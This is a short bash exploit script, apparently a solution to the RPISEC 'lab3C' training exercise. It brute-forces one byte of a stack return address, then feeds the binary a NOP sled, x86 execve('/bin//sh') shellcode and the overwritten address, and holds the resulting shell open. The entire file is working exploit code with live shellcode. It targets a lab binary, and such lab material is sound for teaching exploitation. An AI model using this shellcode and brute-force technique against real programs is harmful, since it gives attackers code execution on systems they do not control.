#!/bin/bash

B=0

# We brute force lower byte of the shellcode address' byte
# because we are unable to reliably determine where it is in memory.
for ((i=120; i < 256; i++))
do 
	B=$(printf "%02x" $i)

	# In case of exception - the program returns some 129,136 and so on Return codes.
	# On success (found byte) there will be code 0.
	(python -c 'buf = "\x90" * 40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" ; buf += "\x90" * (80 - len(buf)); buf += "\x'$B'\xf5\xff\xbf"; print "rpisec\n"+buf') | ./lab3C 2>&1 @> /dev/null && echo Found it - $B && break
done 

# Having found the byte - we invoke the exploit once again and leave the user with shell.
(python -c 'buf = "\x90" * 40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" ; buf += "\x90" * (80 - len(buf)); buf += "\x'$B'\xf5\xff\xbf"; print "rpisec\n"+buf' ; cat) | ./lab3C
